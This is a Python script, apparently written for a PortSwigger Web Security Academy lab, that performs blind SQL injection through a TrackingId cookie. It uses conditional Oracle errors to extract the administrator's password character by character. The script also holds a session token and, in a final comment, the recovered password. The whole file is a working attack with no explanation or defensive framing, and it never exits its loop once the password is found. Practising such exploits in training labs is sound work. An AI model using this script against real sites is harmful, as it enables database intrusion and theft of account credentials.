import requests
import re
import string
import os

# splchars = list()

# for i in range(32,47):
#     splchars.append(chr(i))

#charactors = string.ascii_letters + string.digits + "".join(splchars)
# print(charactors)
charactors = string.ascii_lowercase + string.digits 

seen_password = list()

offset = 1

while (True):
    for ch in charactors:
        url = 'https://ac061fd51e71b7c08036386800aa007d.web-security-academy.net'
        cookies = dict(TrackingId="x'+UNION+SELECT+CASE+WHEN+(username='administrator'+AND+SUBSTR(password,"+ str(offset) +",1)=\'"+ ch + "\')+THEN+to_char(1/0)+ELSE+null+END+FROM+users--", session='ENAq3efReacEuy1Q5VVSj4veF9kRngaF')       
        r = requests.get(url,  cookies=cookies)
        response = r.status_code
        os.system('cls')
        print("trying with password :- ", "".join(seen_password) + ch)
        if ( len(seen_password) != 20):
            if (response == 500):
                seen_password.append(ch)
                print("[+] Found password charectors till now - ",seen_password)
                offset = offset + 1
                break
        else:
            print("[+] Found Password ", "".join(seen_password))

#lkrit812qk49uyyefnb3
